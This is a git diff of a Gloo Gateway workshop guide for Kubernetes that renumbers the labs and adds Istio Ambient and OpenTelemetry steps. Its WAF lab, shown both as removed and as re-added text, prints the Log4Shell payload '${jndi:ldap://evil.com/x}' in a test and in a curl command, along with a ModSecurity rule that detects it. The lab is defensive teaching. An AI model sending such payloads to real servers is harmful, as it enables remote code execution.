@@ -14,29 +14,30 @@ source ./scripts/assert.sh
 ## Table of Contents
 * [Introduction](#introduction)
 * [Lab 1 - Deploy a KinD cluster](#lab-1---deploy-a-kind-cluster-)
-* [Lab 2 - Deploy Gloo Gateway](#lab-2---deploy-gloo-gateway-)
-* [Lab 3 - Deploy Keycloak](#lab-3---deploy-keycloak-)
-* [Lab 4 - Deploy the httpbin demo app](#lab-4---deploy-the-httpbin-demo-app-)
-* [Lab 5 - Expose the httpbin application through the gateway](#lab-5---expose-the-httpbin-application-through-the-gateway-)
-* [Lab 6 - Delegate with control](#lab-6---delegate-with-control-)
-* [Lab 7 - Modify the requests and responses](#lab-7---modify-the-requests-and-responses-)
-* [Lab 8 - Split traffic between 2 backend services](#lab-8---split-traffic-between-2-backend-services-)
-* [Lab 9 - Securing the access with OAuth](#lab-9---securing-the-access-with-oauth-)
-* [Lab 10 - Use the transformation filter to manipulate headers](#lab-10---use-the-transformation-filter-to-manipulate-headers-)
-* [Lab 11 - Apply rate limiting to the Gateway](#lab-11---apply-rate-limiting-to-the-gateway-)
-* [Lab 12 - Use the JWT filter to validate JWT and create headers from claims](#lab-12---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-)
+* [Lab 2 - Deploy Istio in Ambient mode](#lab-2---deploy-istio-in-ambient-mode-)
+* [Lab 3 - Deploy Gloo Gateway](#lab-3---deploy-gloo-gateway-)
+* [Lab 4 - Deploy Keycloak](#lab-4---deploy-keycloak-)
+* [Lab 5 - Deploy the httpbin demo app](#lab-5---deploy-the-httpbin-demo-app-)
+* [Lab 6 - Expose the httpbin application through the gateway](#lab-6---expose-the-httpbin-application-through-the-gateway-)
+* [Lab 7 - Delegate with control](#lab-7---delegate-with-control-)
+* [Lab 8 - Modify the requests and responses](#lab-8---modify-the-requests-and-responses-)
+* [Lab 9 - Split traffic between 2 backend services](#lab-9---split-traffic-between-2-backend-services-)
+* [Lab 10 - Securing the access with OAuth](#lab-10---securing-the-access-with-oauth-)
+* [Lab 11 - Use the transformation filter to manipulate headers](#lab-11---use-the-transformation-filter-to-manipulate-headers-)
+* [Lab 12 - Apply rate limiting to the Gateway](#lab-12---apply-rate-limiting-to-the-gateway-)
 * [Lab 13 - Use the Web Application Firewall filter](#lab-13---use-the-web-application-firewall-filter-)
-* [Lab 14 - Validate and authorize client certificates](#lab-14---validate-and-authorize-client-certificates-)
-* [Lab 15 - Deploy Argo Rollouts](#lab-15---deploy-argo-rollouts-)
-* [Lab 16 - Roll out a new app version using Argo Rollouts](#lab-16---roll-out-a-new-app-version-using-argo-rollouts-)
-* [Lab 17 - Deploy the Bookinfo sample application](#lab-17---deploy-the-bookinfo-sample-application-)
-* [Lab 18 - Expose the productpage API securely](#lab-18---expose-the-productpage-api-securely-)
-* [Lab 19 - Expose an external API and stitch it with the productpage API](#lab-19---expose-an-external-api-and-stitch-it-with-the-productpage-api-)
-* [Lab 20 - Expose the dev portal backend](#lab-20---expose-the-dev-portal-backend-)
-* [Lab 21 - Deploy and expose the dev portal frontend](#lab-21---deploy-and-expose-the-dev-portal-frontend-)
-* [Lab 22 - Dev portal monetization](#lab-22---dev-portal-monetization-)
-* [Lab 23 - Deploy Backstage with the backend plugin](#lab-23---deploy-backstage-with-the-backend-plugin-)
-* [Lab 24 - Deploy OpenTelemetry Collector](#lab-24---deploy-opentelemetry-collector-)
+* [Lab 14 - Use the JWT filter to validate JWT and create headers from claims](#lab-14---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-)
+* [Lab 15 - Validate and authorize client certificates](#lab-15---validate-and-authorize-client-certificates-)
+* [Lab 16 - Deploy Argo Rollouts](#lab-16---deploy-argo-rollouts-)
+* [Lab 17 - Roll out a new app version using Argo Rollouts](#lab-17---roll-out-a-new-app-version-using-argo-rollouts-)
+* [Lab 18 - Deploy OpenTelemetry Collector](#lab-18---deploy-opentelemetry-collector-)
+* [Lab 19 - Deploy the Bookinfo sample application](#lab-19---deploy-the-bookinfo-sample-application-)
+* [Lab 20 - Expose the productpage API securely](#lab-20---expose-the-productpage-api-securely-)
+* [Lab 21 - Expose an external API and stitch it with the productpage API](#lab-21---expose-an-external-api-and-stitch-it-with-the-productpage-api-)
+* [Lab 22 - Expose the dev portal backend](#lab-22---expose-the-dev-portal-backend-)
+* [Lab 23 - Deploy and expose the dev portal frontend](#lab-23---deploy-and-expose-the-dev-portal-frontend-)
+* [Lab 24 - Dev portal monetization](#lab-24---dev-portal-monetization-)
+* [Lab 25 - Deploy Backstage with the backend plugin](#lab-25---deploy-backstage-with-the-backend-plugin-)
 
 
 
@@ -100,7 +101,7 @@ export CLUSTER1=cluster1
 Run the following commands to deploy a Kubernetes cluster using [Kind](https://kind.sigs.k8s.io/):
 
 ```bash
-./scripts/deploy.sh 1 cluster1
+./scripts/deploy-multi.sh 1 cluster1
 ```
 
 Then run the following commands to wait for all the Pods to be ready:
@@ -147,7 +148,103 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> 
 
 
 
-## Lab 2 - Deploy Gloo Gateway <a name="lab-2---deploy-gloo-gateway-"></a>
+## Lab 2 - Deploy Istio in Ambient mode <a name="lab-2---deploy-istio-in-ambient-mode-"></a>
+
+
+Download the Istio release:
+
+```bash
+curl -L https://istio.io/downloadIstio | sh -
+
+if [ -d "istio-"*/ ]; then
+    cd istio-*/
+    export PATH=$PWD/bin:$PATH
+    cd ..
+fi
+```
+
+Install Istio in Ambient mode:
+
+```bash
+helm upgrade --install istio-base \
+  oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/base \
+  -n istio-system --create-namespace \
+  --version 1.23.0-solo \
+  --kube-context ${CLUSTER1} \
+  --wait
+
+helm upgrade --install istio-cni \
+  oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/cni \
+  -n istio-system \
+  --version 1.23.0-solo \
+  --set profile=ambient \
+  --set global.hub=us-docker.pkg.dev/gloo-mesh/istio-<enterprise_istio_repo> \
+  --set global.tag=1.23.0-solo \
+  --kube-context ${CLUSTER1} \
+  --wait
+
+helm upgrade --install istiod \
+  oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/istiod \
+  -n istio-system \
+  --version 1.23.0-solo \
+  --set profile=ambient \
+  --set global.hub=us-docker.pkg.dev/gloo-mesh/istio-<enterprise_istio_repo> \
+  --set global.tag=1.23.0-solo \
+  --kube-context ${CLUSTER1} \
+  --wait
+
+helm upgrade --install ztunnel \
+  oci://us-docker.pkg.dev/gloo-mesh/istio-helm-<enterprise_istio_repo>/ztunnel \
+  -n istio-system \
+  --version 1.23.0-solo \
+  --set profile=ambient \
+  --set hub=us-docker.pkg.dev/gloo-mesh/istio-<enterprise_istio_repo> \
+  --set tag=1.23.0-solo \
+  --set env.L7_ENABLED="true" \
+  --kube-context ${CLUSTER1} \
+  --wait
+```
+
+Run the following command to check the Istio Pods are running:
+
+```bash
+kubectl --context ${CLUSTER1} -n istio-system get pods
+```
+
+Here is the expected output:
+
+```,nocopy
+NAME                      READY   STATUS    RESTARTS   AGE
+istio-cni-node-75ds2      1/1     Running   0          86s
+istiod-7758df6879-pcvjt   1/1     Running   0          45s
+ztunnel-zgf7b             1/1     Running   0          13s
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpers = require('./tests/chai-exec');
+
+describe("Istio", () => {
+  let cluster = process.env.CLUSTER1
+  let deployments = ["istiod"];
+  deployments.forEach(deploy => {
+    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "istio-system", k8sObj: deploy }));
+  });
+  let DaemonSets = ["istio-cni-node", "ztunnel"];
+  DaemonSets.forEach(DaemonSet => {
+    it(DaemonSet + ' pods are ready in ' + cluster, () => helpers.checkDaemonSet({ context: cluster, namespace: "istio-system", k8sObj: DaemonSet }));
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/deploy-istio-ambient/tests/check-istio.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && echo "" && cat ./test.js && exit 1; }
+-->
+
+
+
+## Lab 3 - Deploy Gloo Gateway <a name="lab-3---deploy-gloo-gateway-"></a>
 
 You can deploy Gloo Gateway with the `glooctl` CLI or declaratively using Helm.
 
@@ -157,6 +254,12 @@ Install the Kubernetes Gateway API CRDs as they do not come installed by default
 
 ```bash
 kubectl --context $CLUSTER1 apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.1.0/standard-install.yaml
+```
+Let's create the `gloo-system` namespace and label it to be part of the mesh:
+
+```bash
+kubectl --context $CLUSTER1 create namespace gloo-system
+kubectl --context $CLUSTER1 label namespace gloo-system istio.io/dataplane-mode=ambient
 ```
 
 Next, install Gloo Gateway. This command installs the Gloo Gateway control plane into the namespace `gloo-system`.
@@ -169,7 +272,7 @@ helm repo update
 helm upgrade -i -n gloo-system \
   gloo-gateway gloo-ee-helm/gloo-ee \
   --create-namespace \
-  --version 1.17.2 \
+  --version 1.18.0-beta1 \
   --kube-context $CLUSTER1 \
   --set-string license_key=$LICENSE_KEY \
   -f -<<EOF
@@ -255,7 +358,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> 
 
 
 
-## Lab 3 - Deploy Keycloak <a name="lab-3---deploy-keycloak-"></a>
+## Lab 4 - Deploy Keycloak <a name="lab-4---deploy-keycloak-"></a>
 
 In many use cases, you need to restrict the access to your applications to authenticated users.
 
@@ -615,7 +718,7 @@ timeout 300 bash -c 'while [[ "$(curl -m 2 -s -o /dev/null -w ''%{http_code}'' $
 
 
 
-## Lab 4 - Deploy the httpbin demo app <a name="lab-4---deploy-the-httpbin-demo-app-"></a>
+## Lab 5 - Deploy the httpbin demo app <a name="lab-5---deploy-the-httpbin-demo-app-"></a>
 
 We're going to deploy the httpbin application to demonstrate several features of Gloo Gateway.
 
@@ -625,6 +728,8 @@ Run the following commands to deploy the httpbin app twice (`httpbin1` and `http
 
 ```bash
 kubectl --context ${CLUSTER1} create ns httpbin
+kubectl --context ${CLUSTER1} label namespace httpbin istio.io/dataplane-mode=ambient
+kubectl --context ${CLUSTER1} label namespace httpbin istio-injection=disabled
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: v1
 kind: ServiceAccount
@@ -831,7 +936,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> 
 
 
 
-## Lab 5 - Expose the httpbin application through the gateway <a name="lab-5---expose-the-httpbin-application-through-the-gateway-"></a>
+## Lab 6 - Expose the httpbin application through the gateway <a name="lab-6---expose-the-httpbin-application-through-the-gateway-"></a>
 
 
 
@@ -1201,7 +1306,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> 
 
 
 
-## Lab 6 - Delegate with control <a name="lab-6---delegate-with-control-"></a>
+## Lab 7 - Delegate with control <a name="lab-7---delegate-with-control-"></a>
 
 The team in charge of the gateway can create a parent `HTTPRoute` to delegate the routing of a domain or a path prefix (for example) to an application team.
 
@@ -1653,7 +1758,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> 
 
 
 
-## Lab 7 - Modify the requests and responses <a name="lab-7---modify-the-requests-and-responses-"></a>
+## Lab 8 - Modify the requests and responses <a name="lab-8---modify-the-requests-and-responses-"></a>
 
 The Kubernetes Gateway API provides different options to add/update/remove request and response headers.
 
@@ -2141,7 +2246,7 @@ kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
 
 
 
-## Lab 8 - Split traffic between 2 backend services <a name="lab-8---split-traffic-between-2-backend-services-"></a>
+## Lab 9 - Split traffic between 2 backend services <a name="lab-9---split-traffic-between-2-backend-services-"></a>
 
 You can split traffic between different backends, with different weights.
 
@@ -2216,7 +2321,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> 
 
 
 
-## Lab 9 - Securing the access with OAuth <a name="lab-9---securing-the-access-with-oauth-"></a>
+## Lab 10 - Securing the access with OAuth <a name="lab-10---securing-the-access-with-oauth-"></a>
 
 In this step, we're going to secure the access to the `httpbin` service using OAuth.
 
@@ -2467,7 +2572,7 @@ If you open the browser in incognito and login using the username `user2` and th
 
 
 
-## Lab 10 - Use the transformation filter to manipulate headers <a name="lab-10---use-the-transformation-filter-to-manipulate-headers-"></a>
+## Lab 11 - Use the transformation filter to manipulate headers <a name="lab-11---use-the-transformation-filter-to-manipulate-headers-"></a>
 
 
 In this step, we're going to use a regular expression to extract a part of an existing header and to create a new one:
@@ -2523,7 +2628,7 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> 
 
 
 
-## Lab 11 - Apply rate limiting to the Gateway <a name="lab-11---apply-rate-limiting-to-the-gateway-"></a>
+## Lab 12 - Apply rate limiting to the Gateway <a name="lab-12---apply-rate-limiting-to-the-gateway-"></a>
 
 In this step, we're going to apply rate limiting to the Gateway to only allow 3 requests per minute for the users of the `solo.io` organization.
 
@@ -2636,7 +2741,94 @@ kubectl delete --context ${CLUSTER1} -n httpbin routeoption routeoption
 
 
 
-## Lab 12 - Use the JWT filter to validate JWT and create headers from claims <a name="lab-12---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-"></a>
+## Lab 13 - Use the Web Application Firewall filter <a name="lab-13---use-the-web-application-firewall-filter-"></a>
+
+A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
+
+Gloo Gateway includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections.
+
+An example of how using Gloo Gateway we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
+
+The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit.
+
+Using the Web Application Firewall capabilities you can reject requests containing such headers.
+
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+
+You need to create the following `RouteOption`:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.solo.io/v1
+kind: RouteOption
+metadata:
+  name: waf
+  namespace: gloo-system
+spec:
+  targetRefs:
+  - group: gateway.networking.k8s.io
+    kind: HTTPRoute
+    name: httpbin
+  options:
+    waf:
+      customInterventionMessage: 'Log4Shell malicious payload'
+      ruleSets:
+      - ruleStr: |
+          SecRuleEngine On
+          SecRequestBodyAccess On
+          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
+            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
+            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
+
+As you can see, this `RouteOption` targets the parent `HTTPRoute`. That way, the WAF rule is applied to all the traffic targetting the `httpbin` application.
+
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+const helpersHttp = require('./tests/chai-http');
+var chai = require('chai');
+var expect = chai.expect;
+
+describe("WAF is working properly", function() {
+  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && echo "" && cat ./test.js && exit 1; }
+-->
+
+Run the following command to simulate an attack:
+
+```bash
+curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
+```
+
+The request should be rejected:
+
+```http,nocopy
+HTTP/2 403 
+content-length: 27
+content-type: text/plain
+date: Tue, 05 Apr 2022 10:20:06 GMT
+server: istio-envoy
+
+Log4Shell malicious payload
+```
+
+Let's delete the `RouteOption` we've created:
+
+```bash
+kubectl delete --context ${CLUSTER1} -n gloo-system routeoption waf
+```
+
+
+
+
+## Lab 14 - Use the JWT filter to validate JWT and create headers from claims <a name="lab-14---use-the-jwt-filter-to-validate-jwt-and-create-headers-from-claims-"></a>
 
 In this step, we're going to validate the JWT token and to create a new header from the `email` claim.
 
@@ -2878,94 +3070,7 @@ kubectl --context ${CLUSTER1} -n gloo-system delete virtualhostoption jwt
 
 
 
-## Lab 13 - Use the Web Application Firewall filter <a name="lab-13---use-the-web-application-firewall-filter-"></a>
-
-A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
-
-Gloo Gateway includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections.
-
-An example of how using Gloo Gateway we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
-
-The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit.
-
-Using the Web Application Firewall capabilities you can reject requests containing such headers.
-
-Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
-
-You need to create the following `RouteOption`:
-
-```bash
-kubectl apply --context ${CLUSTER1} -f - <<EOF
-apiVersion: gateway.solo.io/v1
-kind: RouteOption
-metadata:
-  name: waf
-  namespace: gloo-system
-spec:
-  targetRefs:
-  - group: gateway.networking.k8s.io
-    kind: HTTPRoute
-    name: httpbin
-  options:
-    waf:
-      customInterventionMessage: 'Log4Shell malicious payload'
-      ruleSets:
-      - ruleStr: |
-          SecRuleEngine On
-          SecRequestBodyAccess On
-          SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
-            "@rx \\\${jndi:(?:ldaps?|iiop|dns|rmi)://"
-            "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
-EOF
-```
-
-As you can see, this `RouteOption` targets the parent `HTTPRoute`. That way, the WAF rule is applied to all the traffic targetting the `httpbin` application.
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("WAF is working properly", function() {
-  it('The request has been blocked', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', headers: [{key: 'User-Agent', value: '${jndi:ldap://evil.com/x}'}], body: 'Log4Shell malicious payload' }));
-});
-EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/waf/tests/waf.test.js.liquid"
-tempfile=$(mktemp)
-echo "saving errors in ${tempfile}"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && echo "" && cat ./test.js && exit 1; }
--->
-
-Run the following command to simulate an attack:
-
-```bash
-curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://httpbin.example.com/get" -i
-```
-
-The request should be rejected:
-
-```http,nocopy
-HTTP/2 403 
-content-length: 27
-content-type: text/plain
-date: Tue, 05 Apr 2022 10:20:06 GMT
-server: istio-envoy
-
-Log4Shell malicious payload
-```
-
-Let's delete the `RouteOption` we've created:
-
-```bash
-kubectl delete --context ${CLUSTER1} -n gloo-system routeoption waf
-```
-
-
-
-
-## Lab 14 - Validate and authorize client certificates <a name="lab-14---validate-and-authorize-client-certificates-"></a>
+## Lab 15 - Validate and authorize client certificates <a name="lab-15---validate-and-authorize-client-certificates-"></a>
 
 In this step, we're going to secure the access to the httpbin service using mutual TLS (mTLS), and apply further authorization based on information in the client certificate.
 
@@ -3383,7 +3488,7 @@ kubectl --context ${CLUSTER1} -n httpbin delete RouteOption routeoption
 
 
 
-## Lab 15 - Deploy Argo Rollouts <a name="lab-15---deploy-argo-rollouts-"></a>
+## Lab 16 - Deploy Argo Rollouts <a name="lab-16---deploy-argo-rollouts-"></a>
 
 [Argo Rollouts](https://argoproj.github.io/rollouts/) is a declarative progressive delivery tool for Kubernetes that we can use to update applications gradually, using a blue/green or canary strategy to manage the rollout.
 
@@ -3419,7 +3524,7 @@ Now we're ready to use Argo Rollouts to progressively update applications as par
 
 
 
-## Lab 16 - Roll out a new app version using Argo Rollouts <a name="lab-16---roll-out-a-new-app-version-using-argo-rollouts-"></a>
+## Lab 17 - Roll out a new app version using Argo Rollouts <a name="lab-17---roll-out-a-new-app-version-using-argo-rollouts-"></a>
 
 We're going to use Argo Rollouts to gradually deliver an upgraded version of our httpbin application.
 To do this, we'll define a resource that lets Argo Rollouts know how we want it to handle updates to our application,
@@ -4414,7 +4519,206 @@ EOF
 
 
 
-## Lab 17 - Deploy the Bookinfo sample application <a name="lab-17---deploy-the-bookinfo-sample-application-"></a>
+## Lab 18 - Deploy OpenTelemetry Collector <a name="lab-18---deploy-opentelemetry-collector-"></a>
+
+Having metrics is essential for running applications reliably, and gateways are no exceptions.
+
+Using [OpenTelemetry Collectors](https://github.com/open-telemetry/opentelemetry-collector-contrib) is a nice way to collect, transform, and ship telemetry to your observability backends.
+
+Let's deploy the OSS distribution of OpenTelemetry Collector, and get started!
+
+```bash
+helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts
+helm repo update
+
+helm upgrade --install opentelemetry-collector open-telemetry/opentelemetry-collector \
+--version 0.97.1 \
+--set mode=deployment \
+--set image.repository="otel/opentelemetry-collector-contrib" \
+--set command.name="otelcol-contrib" \
+--namespace=otel \
+--create-namespace \
+-f -<<EOF
+clusterRole:
+  create: true
+  rules:
+  - apiGroups:
+    - ''
+    resources:
+    - 'pods'
+    - 'nodes'
+    verbs:
+    - 'get'
+    - 'list'
+    - 'watch'
+ports:
+  promexporter:
+    enabled: true
+    containerPort: 9099
+    servicePort: 9099
+    protocol: TCP
+config:
+  receivers:
+    prometheus/gloo-dataplane:
+      config:
+        scrape_configs:
+        # Scrape the Gloo Gateway pods
+        - job_name: gloo-gateways
+          honor_labels: true
+          kubernetes_sd_configs:
+          - role: pod
+          relabel_configs:
+            - action: keep
+              regex: kube-gateway
+              source_labels:
+              - __meta_kubernetes_pod_label_gloo
+            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
+              action: keep
+              regex: true
+            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
+              action: replace
+              target_label: __metrics_path__
+              regex: (.+)
+            - action: replace
+              source_labels:
+              - __meta_kubernetes_pod_ip
+              - __meta_kubernetes_pod_annotation_prometheus_io_port
+              separator: ':'
+              target_label: __address__
+            - action: labelmap
+              regex: __meta_kubernetes_pod_label_(.+)
+            - source_labels: [__meta_kubernetes_namespace]
+              action: replace
+              target_label: kube_namespace
+            - source_labels: [__meta_kubernetes_pod_name]
+              action: replace
+              target_label: pod
+    prometheus/gloo-controlplane:
+      config:
+        scrape_configs:
+        # Scrape the Gloo pods
+        - job_name: gloo-gateways
+          honor_labels: true
+          kubernetes_sd_configs:
+          - role: pod
+          relabel_configs:
+            - action: keep
+              regex: gloo
+              source_labels:
+              - __meta_kubernetes_pod_label_gloo
+            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
+              action: keep
+              regex: true
+            - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
+              action: replace
+              target_label: __metrics_path__
+              regex: (.+)
+            - action: replace
+              source_labels:
+              - __meta_kubernetes_pod_ip
+              - __meta_kubernetes_pod_annotation_prometheus_io_port
+              separator: ':'
+              target_label: __address__
+            - action: labelmap
+              regex: __meta_kubernetes_pod_label_(.+)
+            - source_labels: [__meta_kubernetes_namespace]
+              action: replace
+              target_label: kube_namespace
+            - source_labels: [__meta_kubernetes_pod_name]
+              action: replace
+              target_label: pod
+  exporters:
+    prometheus:
+      endpoint: 0.0.0.0:9099
+    debug: {}
+  service:
+    pipelines:
+      metrics:
+        receivers: [prometheus/gloo-dataplane, prometheus/gloo-controlplane]
+        processors: [batch]
+        exporters: [prometheus]
+EOF
+```
+
+This deployment will now scrape our Gateways' metrics, and expose these metrics in Prometheus format.
+
+While you could scrape the Gateway pods directly as well, that might only work if you only want to consume them from the local cluster. Or, you could be standardizing on OpenTelemetry to avoid vendor/project specific agents. In this case, ingesting the metrics into an OTel Collector can make perfect sense, since you can freely transform telemetry data and ship to the backend of your liking.
+
+For simplicity's sake, let's imagine that our desired backend is a local Prometheus instance. Let's get the telemetry data in to that one!
+
+First, let's install kube-prometheus-stack!
+
+```bash
+helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
+helm repo update
+
+helm upgrade --install kube-prometheus-stack \
+prometheus-community/kube-prometheus-stack \
+--version 61.2.0 \
+--namespace monitoring \
+--create-namespace \
+--values - <<EOF
+grafana:
+  service:
+    type: LoadBalancer
+    port: 3000
+prometheus:
+  prometheusSpec:
+    ruleSelectorNilUsesHelmValues: false
+    serviceMonitorSelectorNilUsesHelmValues: false
+    podMonitorSelectorNilUsesHelmValues: false
+EOF
+```
+
+Finally, configure scraping for our OTel Collector via a PodMonitor!
+
+```bash
+cat <<EOF | kubectl apply -n otel -f -
+apiVersion: monitoring.coreos.com/v1
+kind: PodMonitor
+metadata:
+  name: otel-monitor
+spec:
+  podMetricsEndpoints:
+  - interval: 30s
+    port: promexporter
+    scheme: http
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: opentelemetry-collector
+EOF
+```
+
+Now let's import a sample dashboard!
+
+```bash
+kubectl -n monitoring create cm envoy-dashboard \
+--from-file=data/steps/deploy-otel-collector/envoy.json
+kubectl label -n monitoring cm envoy-dashboard grafana_dashboard=1
+```
+
+Let's generate some traffic!
+
+```shell,run
+for i in {1..5}; do curl https://httpbin.example.com/get -v; done
+```
+
+
+To access Grafana, you need to get the endpoint using the following command:
+
+```bash
+echo "http://$(kubectl --context ${CLUSTER1} -n monitoring get svc kube-prometheus-stack-grafana -o jsonpath='{.status.loadBalancer.ingress[0].*}'):3000"
+```
+
+
+Login with `admin` and `prom-operator` you should be able to see how traffic flows trough your Gateways!
+			    
+![Envoy dashboard](images/steps/deploy-otel-collector/envoy.png)
+
+
+
+
+## Lab 19 - Deploy the Bookinfo sample application <a name="lab-19---deploy-the-bookinfo-sample-application-"></a>
 [<img src="https://img.youtube.com/vi/nzYcrjalY5A/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/nzYcrjalY5A "Video Link")
 
 We're going to deploy the Bookinfo sample application to demonstrate several features of Gloo Gateway.
@@ -4459,7 +4763,7 @@ Configure your hosts file to resolve bookinfo.example.com with the IP address of
 
 
 
-## Lab 18 - Expose the productpage API securely <a name="lab-18---expose-the-productpage-api-securely-"></a>
+## Lab 20 - Expose the productpage API securely <a name="lab-20---expose-the-productpage-api-securely-"></a>
 
 Gloo Gateway includes a developer portal, which provides a framework for managing API discovery, API client identity, and API policies.
 
@@ -4938,7 +5242,7 @@ As you can see, we can also define custom metadata at the Api product level. We 
 
 
 
-## Lab 19 - Expose an external API and stitch it with the productpage API <a name="lab-19---expose-an-external-api-and-stitch-it-with-the-productpage-api-"></a>
+## Lab 21 - Expose an external API and stitch it with the productpage API <a name="lab-21---expose-an-external-api-and-stitch-it-with-the-productpage-api-"></a>
 
 You can also use Gloo Gateway to expose an API that is outside of the cluster. In this section, we will expose `https://openlibrary.org/search.json`
 
@@ -5201,7 +5505,7 @@ EOF
 
 
 
-## Lab 20 - Expose the dev portal backend <a name="lab-20---expose-the-dev-portal-backend-"></a>
+## Lab 22 - Expose the dev portal backend <a name="lab-22---expose-the-dev-portal-backend-"></a>
 
 Now that your API has been exposed securely and our plans defined, lets advertise this API through a developer portal.
 
@@ -5365,7 +5669,7 @@ We'll create it later.
 
 
 
-## Lab 21 - Deploy and expose the dev portal frontend <a name="lab-21---deploy-and-expose-the-dev-portal-frontend-"></a>
+## Lab 23 - Deploy and expose the dev portal frontend <a name="lab-23---deploy-and-expose-the-dev-portal-frontend-"></a>
 
 The developer frontend is provided as a fully functional template to allow you to customize it based on your own requirements.
 
@@ -5603,7 +5907,7 @@ Now, if you click on the `VIEW APIS` button, you should see the `Bookinfo REST A
 
 
 
-## Lab 22 - Dev portal monetization <a name="lab-22---dev-portal-monetization-"></a>
+## Lab 24 - Dev portal monetization <a name="lab-24---dev-portal-monetization-"></a>
 
 The `portalMetadata` section of the `ApiProduct` objects we've created previously is used to add some metadata in the access logs.
 
@@ -5733,438 +6037,8 @@ timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=150 --bail 2> 
